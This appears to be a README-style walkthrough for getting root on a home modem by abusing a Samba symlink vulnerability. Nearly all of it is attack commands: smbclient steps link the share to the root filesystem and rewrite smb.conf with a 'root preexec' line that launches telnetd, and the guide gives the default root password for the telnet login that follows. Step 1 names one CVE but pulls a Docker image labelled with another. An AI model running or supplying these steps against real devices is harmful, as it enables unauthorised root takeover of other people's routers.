1. Grab cve-2017-2619 client:
```bash
docker pull kezzyhko/cve-2010-0926_attacker
docker run -it --name cve-2010-0926_attacker kezzyhko/cve-2010-0926_attacker
```

2. Insert a NTFS-formatted USB drive into the modem

3. Run `smbclient -N \\\\192.168.0.200\\storage0 -c 'symlink / rootfs'` to create a symbolic link to the rootfs.

4. Run `smbclient -N \\\\192.168.0.200\\storage0 -c 'get rootfs/var/samba/lib/smb.conf smb.conf'` to get the current

5. Add these lines to `smb.conf`, before `[storage0]`:
```
[rootfs]
  comment = rootfs
  valid users = admin, user, root
  writable = yes
  path = /
  root preexec = /bin/sh -c '/usr/sbin/telnetd &'
  guest ok = yes
  browseable = yes
```

6. Run `smbclient -N //192.168.0.200/storage0 -c 'put smb.conf rootfs/var/samba/lib/smb.conf'` to upload the changed `smb.conf`.

7. Insert another USB drive into the modem, can be FAT32 or NTFS formatted.

8. Access `\\192.168.0.200\rootfs`, it should trigger the `root preexec` script. You can also browse the files, most of them are read-only.

9. telnet to 192.168.0.200, user: `root`, password: `broadcom`

See:
https://github.com/kezzyhko/vulnsamba#cve-2017-2619

